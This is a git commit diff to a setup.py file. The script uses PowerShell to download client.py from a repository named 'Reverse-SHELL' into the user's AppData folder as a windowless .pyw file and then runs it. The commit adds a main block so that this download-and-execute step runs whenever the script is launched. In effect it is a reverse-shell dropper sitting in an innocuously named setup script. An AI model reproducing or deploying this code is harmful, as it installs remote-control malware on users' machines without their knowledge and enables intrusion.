02b73d10ae8d6e6e1b108ea0f2b57f7ad38647ea
Muzaffar Sharofitdinov <smartboymuzaffar@gmail.com>
2024-04-27 04:56:55 +0900

    Update setup.py

--- setup.py
+++ setup.py
@@ -7,7 +7,10 @@ path = os.environ['appdata'] + '\\client.pyw'
 def setup():
   if not os.path.exists(path):
     subprocess.call(
-      'powershell invoke-webrequest -uri "https://raw.githubusercontent.com/SmartBoyMuzaffar/Reverse-SHELL/master/client.py" -outfile "{path}"',
+      'powershell.exe invoke-webrequest -uri "https://raw.githubusercontent.com/SmartBoyMuzaffar/Reverse-SHELL/master/client.py" -outfile "{path}"',
       shell=True)
   subprocess.call('powershell.exe {path}')
 ################################################ done ##################################################################
+# Running code ...
+if __name__ == '__main__':
+  setup()
